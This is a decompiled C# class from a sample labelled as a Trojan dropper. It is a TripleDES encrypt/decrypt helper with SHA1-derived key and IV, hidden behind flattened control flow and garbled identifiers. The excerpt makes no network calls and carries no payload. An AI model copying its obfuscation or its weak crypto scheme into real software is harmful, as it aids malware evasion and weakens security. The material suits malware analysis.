// Decompiled with JetBrains decompiler
// Type: AltiumManager.Simple3Des
// Assembly: NtRFufHofqVzZAe, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 66A3465D-1BFC-53F3-99D7-B93CF53E7ECD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Dropper.MSIL.Dapato.gen-3a2a9cfdbd61a0059dfc842bf5333d9548d205d7c6313ef12be7840df044fc87.exe

using AltiumManager.My;
using AltiumManager.My.Resources;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace AltiumManager
{
  public sealed class Simple3Des
  {
    private TripleDESCryptoServiceProvider TripleDes;

    private byte[] \uE6E1\uE1D9\uED70\uEAB4\uF63F\uE3A6\uEDA2\uF136\uE143\uF84F\uF379\uF882(
      string _param1,
      int _param2)
    {
label_5:
      int num1 = 20;
      int num2 = 3;
      byte[] numArray;
      while (true)
      {
        switch (num2 ^ 153)
        {
          case 151:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Simple3Des.\uE6E1\uE1D9\uED70\uEAB4\uF63F\uE3A6\uEDA2\uF136\uE143\uF84F\uF379\uF882);
            num2 = 14;
            continue;
          case 152:
            goto label_5;
          case 153:
            SHA1CryptoServiceProvider cryptoServiceProvider;
            byte[] arySrc;
            byte[] bytes;
            switch (num1)
            {
              case 154:
                cryptoServiceProvider = new SHA1CryptoServiceProvider();
                num1 = 18;
                goto label_1;
              case 155:
                numArray = arySrc;
                num1 = 16;
                goto label_1;
              case 156:
                bytes = Encoding.Unicode.GetBytes(_param1);
                num1 = 19;
                goto label_1;
              case 157:
                arySrc = cryptoServiceProvider.ComputeHash(bytes);
                num1 = 46;
                goto label_1;
              case 158:
              case 161:
                goto label_14;
              case 159:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Simple3Des.encryptData);
                num1 = 17;
                goto label_1;
              case 160:
                arySrc = (byte[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) arySrc, (Array) new byte[checked (_param2 - 1 + 1)]);
                num1 = 21;
                goto label_1;
              default:
                num2 = 1;
                continue;
            }
          case 154:
label_1:
            num1 ^= 142;
            break;
        }
        num2 = 0;
      }
label_14:
      return numArray;
    }

    public Simple3Des(string key)
    {
label_6:
      int num1 = \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF260.\uF082\uF12C\uE11A\uE8A0\uE428\uF545\uE4D3\uE1FE\uEE4C\uE9EC\uF5C3\uEFB7.\uEA88\uE10F\uE996\uE661\uF488\uF652\uF8B1\uE5BC\uF339\uE8F4\uF2C0\uF484(99);
      int num2 = -31;
      while (true)
      {
        switch ((num2 ^ 145) + 147)
        {
          case 0:
            switch (num1 + 147)
            {
              case 0:
                num1 = -32;
                goto label_1;
              case 1:
                this.TripleDes = new TripleDESCryptoServiceProvider();
                num1 = -4;
                goto label_1;
              case 2:
                this.TripleDes.Key = this.\uE6E1\uE1D9\uED70\uEAB4\uF63F\uE3A6\uEDA2\uF136\uE143\uF84F\uF379\uF882(key, this.TripleDes.KeySize / 8);
                num1 = -30;
                goto label_1;
              case 3:
                this.TripleDes.IV = this.\uE6E1\uE1D9\uED70\uEAB4\uF63F\uE3A6\uEDA2\uF136\uE143\uF84F\uF379\uF882("", this.TripleDes.BlockSize / 8);
                num1 = -2;
                goto label_1;
              case 4:
                num1 = \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF260.\uF082\uF12C\uE11A\uE8A0\uE428\uF545\uE4D3\uE1FE\uEE4C\uE9EC\uF5C3\uEFB7.\uEA88\uE10F\uE996\uE661\uF488\uF652\uF8B1\uE5BC\uF339\uE8F4\uF2C0\uF484(113);
                goto label_1;
              case 5:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Simple3Des.\uE6E1\uE1D9\uED70\uEAB4\uF63F\uE3A6\uEDA2\uF136\uE143\uF84F\uF379\uF882);
                num1 = -31;
                goto label_1;
              case 6:
                goto label_14;
              default:
                num2 = \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF260.\uF082\uF12C\uE11A\uE8A0\uE428\uF545\uE4D3\uE1FE\uEE4C\uE9EC\uF5C3\uEFB7.\uEA88\uE10F\uE996\uE661\uF488\uF652\uF8B1\uE5BC\uF339\uE8F4\uF2C0\uF484(108);
                continue;
            }
          case 1:
            goto label_6;
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Simple3Des.decryptData);
            num2 = -2;
            continue;
          case 3:
label_1:
            num1 ^= 147;
            break;
        }
        num2 = \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF260.\uF082\uF12C\uE11A\uE8A0\uE428\uF545\uE4D3\uE1FE\uEE4C\uE9EC\uF5C3\uEFB7.\uEA88\uE10F\uE996\uE661\uF488\uF652\uF8B1\uE5BC\uF339\uE8F4\uF2C0\uF484(112);
      }
label_14:;
    }

    public string encryptData(string plaintext)
    {
label_4:
      int num1 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE93(93);
      int num2 = 18;
      string base64String;
      while (true)
      {
        switch (num2 ^ 142)
        {
          case 153:
            goto label_4;
          case 154:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Simple3Des.\u002Ector);
            num2 = 20;
            continue;
          case 155:
            MemoryStream memoryStream;
            byte[] bytes;
            CryptoStream cryptoStream;
            switch (num1 + 152)
            {
              case 0:
              case 10:
                goto label_17;
              case 1:
                base64String = Convert.ToBase64String(memoryStream.ToArray());
                num1 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE92(82);
                goto label_1;
              case 2:
                bytes = Encoding.Unicode.GetBytes(plaintext);
                num1 = -9;
                goto label_1;
              case 3:
                cryptoStream.Write(bytes, 0, bytes.Length);
                num1 = -10;
                goto label_1;
              case 4:
                cryptoStream = new CryptoStream((Stream) memoryStream, this.TripleDes.CreateEncryptor(), CryptoStreamMode.Write);
                num1 = -13;
                goto label_1;
              case 5:
                cryptoStream.FlushFinalBlock();
                num1 = -24;
                goto label_1;
              case 6:
                num1 = -11;
                goto label_1;
              case 7:
                memoryStream = new MemoryStream();
                num1 = -12;
                goto label_1;
              case 8:
                num1 = -15;
                goto label_1;
              case 9:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Simple3Des.encryptData);
                num1 = -23;
                goto label_1;
              default:
                num2 = 23;
                continue;
            }
          case 156:
label_1:
            num1 ^= 152;
            break;
        }
        num2 = 21;
      }
label_17:
      return base64String;
    }

    public string decryptData(string encryptedText)
    {
label_7:
      int num1 = \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF260.\uF082\uF12C\uE11A\uE8A0\uE428\uF545\uE4D3\uE1FE\uEE4C\uE9EC\uF5C3\uEFB7.\uEA88\uE10F\uE996\uE661\uF488\uF652\uF8B1\uE5BC\uF339\uE8F4\uF2C0\uF484(114);
      int num2 = \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF260.\uF082\uF12C\uE11A\uE8A0\uE428\uF545\uE4D3\uE1FE\uEE4C\uE9EC\uF5C3\uEFB7.\uEA88\uE10F\uE996\uE661\uF488\uF652\uF8B1\uE5BC\uF339\uE8F4\uF2C0\uF485(117);
      string str;
      while (true)
      {
        switch ((num2 ^ 142) + 148)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Simple3Des.decryptData);
            num2 = -30;
            continue;
          case 1:
            MemoryStream memoryStream;
            CryptoStream cryptoStream;
            byte[] buffer;
            switch (num1 + 145)
            {
              case 0:
                str = Encoding.Unicode.GetString(memoryStream.ToArray());
                num1 = -26;
                goto label_1;
              case 1:
                num1 = -8;
                goto label_1;
              case 2:
              case 10:
                goto label_17;
              case 3:
                cryptoStream = new CryptoStream((Stream) memoryStream, this.TripleDes.CreateDecryptor(), CryptoStreamMode.Write);
                num1 = -30;
                goto label_1;
              case 4:
                buffer = Convert.FromBase64String(encryptedText);
                num1 = -29;
                goto label_1;
              case 5:
                memoryStream = new MemoryStream();
                num1 = -27;
                goto label_1;
              case 6:
                cryptoStream.Write(buffer, 0, buffer.Length);
                num1 = -32;
                goto label_1;
              case 7:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Simple3Des.\u002Ector);
                num1 = -31;
                goto label_1;
              case 8:
                // ISSUE: reference to a compiler-generated method
                num1 = Platinium.\uE914\uE4B6\uE066\uEBD1\uE75B\uE04D\uE6A3\uF28F\uF124\uF18E\uEEEF\uE130(132);
                goto label_1;
              case 9:
                cryptoStream.FlushFinalBlock();
                num1 = -25;
                goto label_1;
              default:
                num2 = -32;
                continue;
            }
          case 2:
            goto label_7;
          case 3:
label_1:
            num1 ^= 151;
            break;
        }
        num2 = \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF260.\uF082\uF12C\uE11A\uE8A0\uE428\uF545\uE4D3\uE1FE\uEE4C\uE9EC\uF5C3\uEFB7.\uEA88\uE10F\uE996\uE661\uF488\uF652\uF8B1\uE5BC\uF339\uE8F4\uF2C0\uF484(113);
      }
label_17:
      return str;
    }
  }
}
